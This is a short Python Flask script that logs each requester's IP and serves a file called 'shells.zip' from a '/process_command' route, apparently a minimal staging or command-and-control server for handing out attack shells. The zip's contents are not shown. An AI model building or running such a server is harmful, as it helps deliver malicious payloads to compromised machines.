from flask import Flask, request, make_response, send_file
import socket
import os
import base64


SERVER_HOSTNAME = socket.gethostname()
SERVER_IP = socket.gethostbyname(SERVER_HOSTNAME)
PID = str(os.getpid())


print("HTTPS Server started on: " + SERVER_HOSTNAME + " with IP: " + SERVER_IP + "\nPID: " + PID)
app = Flask(__name__)



@app.route('/process_command', methods=['GET'])
def process_command():
    client_ip = request.remote_addr
    print("'/process_command' -  incoming request from IP: " + client_ip)
    return send_file("shells.zip", as_attachment=True)


if __name__ == '__main__':
    # app.run(host="0.0.0.0", port=8080, ssl_context='adhoc')
    app.run(host="0.0.0.0", port=8080)


